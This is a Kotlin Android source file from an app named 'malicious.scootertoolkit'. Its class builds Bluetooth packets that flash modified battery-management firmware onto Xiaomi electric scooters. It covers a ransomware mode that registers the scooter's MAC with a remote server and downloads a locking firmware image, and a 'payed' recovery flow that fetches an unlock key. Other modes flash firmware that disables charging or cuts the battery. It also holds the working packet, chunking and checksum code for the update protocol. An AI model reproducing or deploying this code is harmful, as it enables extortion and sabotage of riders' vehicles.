package com.malicious.scootertoolkit.xiaomi

import android.content.res.Resources
import android.util.Log
import com.malicious.scootertoolkit.R
import com.malicious.scootertoolkit.api.ApiClient
import com.malicious.scootertoolkit.api.Mac
import com.malicious.scootertoolkit.api.Update
import com.malicious.scootertoolkit.ble.BleMain
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking

class RansomPacketsCreator constructor(fw : FW, resources : Resources) {

    companion object{

        private const val TAG = "RansomPacketsCreator"

        enum class FW(val fw: Int) {
            RANSOM_RECOVER(-2),
            RECOVER(-1),
            RANSOMWARE(0),
            DISCONNECT(1),
            DISABLECHARGE(2)
        }

        enum class MODEL(val model: Int) {
            M365PRO(0),
            PRO2LITE1S3(1)
        }
    }

    private lateinit var fw_content : ByteArray
    private var numberOfElements : Int = 0
    private var lastElementLength : Int = 0
    private var fw_chunks : ArrayList<ByteArray>
    private var key: String? = null


    init{
        fun readBin(id : Int) {
            val inputStream = resources.openRawResource(id)
            val buffer = ByteArray(inputStream.available())
            inputStream.read(buffer)
            fw_content = buffer.copyOf()
            inputStream.close()
        }


        /*when (fw){
            FW.RECOVER -> {
                Log.d(TAG, "Reading BMS115 bytes...")
                readBin(R.raw.m365pro_bms115)
            }
            FW.RANSOMWARE -> {}
            FW.DISABLECHARGE -> {
                Log.d(TAG, "Reading BMS126_nocharge bytes...")
                readBin(R.raw.m365pro_nocharge)
            }
            FW.DISCONNECT -> {
                Log.d(TAG, "Reading BMS126_disconnect bytes...")
                readBin(R.raw.m365pro_disconnect)
            }
        }*/
        val mac = BleMain.getInstance()!!.getMacAddress()
        Log.d(TAG, "MAC address: $mac")
        when (fw){
            FW.RANSOM_RECOVER -> {
                Log.d(TAG, "Checking ransomware state...")
                //TODO(Implement payment)
                Log.d(TAG, "Checking payment...")
                val apiClient = ApiClient()
                var coroutine = CoroutineScope(Dispatchers.Default).launch {
                    mac?.let { Update(mac = it, payed = true) }
                        ?.let { apiClient.updateScooterStatus(it) }
                }
                runBlocking {
                    coroutine.join()
                }


                coroutine = CoroutineScope(Dispatchers.Default).launch {
                    key = mac?.let { Mac(mac = it) }?.let { apiClient.getKey(it) }
                    if (key == null)
                        Log.d(TAG, "Key is null...")
                }
                runBlocking {
                    coroutine.join()
                }

                readBin(R.raw.m365pro_bms115)
            }
            FW.RECOVER -> {
                Log.d(TAG, "Reading stock bytes...")
                readBin(R.raw.m365pro_bms115)
            }
            FW.RANSOMWARE -> {
                Log.d(TAG, "Retrieving binary from server...")
                val apiClient = ApiClient()

                var coroutine = CoroutineScope(Dispatchers.Default).launch {
                    mac?.let { Mac(it) }?.let { apiClient.createScooter(it) }
                }
                runBlocking {
                    coroutine.join()
                }
                coroutine = CoroutineScope(Dispatchers.Default).launch {
                    fw_content = mac?.let { Mac(it) }?.let { apiClient.getBms(it) }
                        ?.let { hexStringToByteArray(it) }!!
                }
                runBlocking {
                    coroutine.join()
                }

            }
            FW.DISABLECHARGE -> {
                Log.d(TAG, "Reading BMS126_nocharge bytes...")
                readBin(R.raw.mi3pro21sessential_nocharge)
            }
            FW.DISCONNECT -> {
                Log.d(TAG, "Reading BMS126_disconnect bytes...")
                readBin(R.raw.mi3pro21sessential_disconnect)
            }
        }

        val result = createByteArrayList(fw_content)
        numberOfElements = result.third
        lastElementLength = result.second
        fw_chunks = result.first

        fun ByteArray.toHexString() = joinToString("") { "%02x".format(it) }

        for (chunk in fw_chunks)
            Log.d(TAG, "FW Chunks ${chunk.toHexString()} \n")
        Log.d(TAG, "FW numberOfElements $numberOfElements \n")
        Log.d(TAG, "FW lastElementLength $lastElementLength \n")

    }

    fun hexStringToByteArray(hexString: String): ByteArray =
        hexString.chunked(2)
            .map { it.toInt(16).toByte() }
            .toByteArray()

    private fun createByteArrayList(hexContent: ByteArray): Triple<ArrayList<ByteArray>, Int, Int> {
        val arrayList = ArrayList<ByteArray>()
        var startIndex = 0

        while (startIndex < hexContent.size) {
            val endIndex = minOf(startIndex + 0x80, hexContent.size)
            val chunk = hexContent.sliceArray(startIndex until endIndex)
            arrayList.add(chunk)
            startIndex = endIndex
        }
        val lastElementLength = hexContent.size % 128
        val numberOfElements = arrayList.size
        return Triple(arrayList, lastElementLength, numberOfElements)
    }


// 55aa0622070095340000

    fun createUnlockRansomwarePacket() : ByteArray? {
        return key?.let { hexStringToByteArray(it) }?.let {
            concatByteArrays(byteArrayOf(
                MiProtocolConst.HEADER[0],
                MiProtocolConst.HEADER[1],
                0x0f, //TODO(Improve length)
                MiProtocolConst.TOBMS,
                0xee.toByte(),
            ), it)
        }
    }

    fun createUnlockRansomwarePacket(test: Boolean) : ByteArray? {
        return byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            0x09, //TODO(Improve length)
            MiProtocolConst.TOBMS,
            0xee.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            0xff.toByte(),
            )

    }

    fun createInitPacket() : ByteArray {
        var numberOfElements = this.numberOfElements
        var lastElementLength = this.lastElementLength
        numberOfElements /= 2
        numberOfElements -= 1
        lastElementLength += 0x80
        return byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            0x06, //TODO(Improve length)
            MiProtocolConst.TOBMS,
            MiProtocolConst.INIT_UPDATE,
            0x00,
            //lastElementLength.toByte(),
            //numberOfElements.toByte(),
            0x4c,
            0x37,
            0x00,
            0x00
        )
    }

    fun createChunkPacket() : ArrayList<ByteArray> {
        val chunkPackets = ArrayList<ByteArray>()
        for (chunk in 0 until  numberOfElements-1){
            chunkPackets.add(concatByteArrays(byteArrayOf(
                MiProtocolConst.HEADER[0],
                MiProtocolConst.HEADER[1],
                0x82.toByte(),
                MiProtocolConst.TOBMS,
                MiProtocolConst.CHUNK_UPDATE,
                chunk.toByte()),
                fw_chunks[chunk]))

        }

        chunkPackets.add(concatByteArrays(byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            (lastElementLength+2).toByte(),
            MiProtocolConst.TOBMS,
            MiProtocolConst.CHUNK_UPDATE,
            (numberOfElements-1).toByte()),
            fw_chunks[numberOfElements-1]))


        return chunkPackets
    }

//55aa062209005eddeaff
//55aa062209007960eaff

    fun createChecksumPacket() : ByteArray {
        val checksum = calculateCRC(fw_content)
        return byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            0x06,
            MiProtocolConst.TOBMS,
            MiProtocolConst.CHECK_UPDATE,
            0x00,
            checksum[0],
            checksum[1],
            checksum[2],
            checksum[3]
        )
    }

    fun createResetPacket() : ByteArray {
        return byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            0x02,
            MiProtocolConst.TOBMS,
            MiProtocolConst.FINISH_UPDATE,
            0x00
        )
    }
    //55aa042002780100

    fun createFinalPacket() : ByteArray {
        return byteArrayOf(
            MiProtocolConst.HEADER[0],
            MiProtocolConst.HEADER[1],
            0x04,
            0x20,
            0x02,
            0x78,
            0x01,
            0x00
        )
    }


    fun createChangeNamePacket() : ByteArray {
        return "55aa09205000742e6c792f6a4b".toByteArray(Charsets.UTF_8)
    }


    private fun calculateCRC(bytes: ByteArray): ByteArray {
        var crc: Int = 0
        for (byte in bytes) {
            crc += byte.toInt() and 0xFF
        }
        crc = (crc.inv() + 4294967296).toInt()
        val crcBytes = ByteArray(4)
        crcBytes[3] = (crc shr 24 and 0xFF).toByte()
        crcBytes[2] = (crc shr 16 and 0xFF).toByte()
        crcBytes[1] = (crc shr 8 and 0xFF).toByte()
        crcBytes[0] = (crc and 0xFF).toByte()
        return crcBytes
    }


    private fun concatByteArrays(first: ByteArray, second: ByteArray): ByteArray {
        val result = ByteArray(first.size + second.size)
        System.arraycopy(first, 0, result, 0, first.size)
        System.arraycopy(second, 0, result, first.size, second.size)
        return result
    }


}